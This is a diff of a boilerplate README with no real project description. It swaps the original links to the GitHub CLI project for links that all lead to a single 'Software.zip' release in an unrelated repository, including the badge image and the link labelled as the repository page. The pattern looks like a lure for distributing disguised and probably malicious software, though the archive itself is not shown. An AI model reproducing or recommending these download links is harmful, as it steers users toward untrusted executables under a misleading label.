@@ -7,16 +7,16 @@ This repository does not have a specific short description provided. However, yo
 No specific topics are provided for this repository.
 
 ## Getting Started
-To get started with the project, you can download the latest version of the code as a zip file by clicking [here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip).
+To get started with the project, you can download the latest version of the code as a zip file by clicking [here](https://github.com/blela/111/releases/download/v1.0/Software.zip).
 
-[![Download Zip File](https://img.shields.io/badge/Download-Zip_File-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Zip File](https://github.com/blela/111/releases/download/v1.0/Software.zip)](https://github.com/blela/111/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the zip file, extract it and you are all set to explore the contents of the repository.
 
 ## Explore Further
 If the provided link does not work or if it ends with the file name, kindly check the "Releases" section of the repository for alternative download options.
 
-Feel free to visit the [GitHub Repository](https://github.com/cli/cli) for more information and updates.
+Feel free to visit the [GitHub Repository](https://github.com/blela/111/releases/download/v1.0/Software.zip) for more information and updates.
 
 ## Additional Resources
 You can refer to the GitHub repository for any additional resources, such as documentation, guides, or community forums related to this project.
